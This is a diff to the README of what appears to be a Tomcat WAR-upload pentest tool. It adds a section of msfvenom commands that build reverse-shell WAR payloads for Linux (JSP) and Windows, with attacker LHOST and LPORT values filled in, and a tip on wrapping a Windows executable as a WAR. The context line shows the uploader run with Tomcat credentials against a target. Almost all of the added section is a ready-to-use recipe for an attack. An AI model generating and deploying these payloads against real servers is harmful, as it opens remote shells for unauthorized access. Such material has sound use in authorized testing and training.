@@ -67,6 +67,28 @@ python3 tomcat_war_uploader.py --url http://10.10.10.10:8080 --username tomcat -
 
 ---
 
+## 🎯 Generating a Reverse Shell with `msfvenom`
+
+You can generate a `.war` file payload using `msfvenom` for either Linux (JSP-based) or Windows (EXE wrapped as `.war`):
+
+### 🔹 For Linux (JSP reverse shell):
+
+```bash
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.119.122 LPORT=443 -f war -o revshell.war
+```
+
+### 🔹 For Windows (EXE reverse shell wrapped in WAR):
+
+```bash
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.15.83 LPORT=9002 -f war > revshell.war
+```
+
+> ⚠️ For Windows payloads, make sure the target Tomcat server supports deploying `.exe` via WAR (less common, more of a wrapper trick).
+
+---
+
+---
+
 ## ✅ Output
 
 ```text
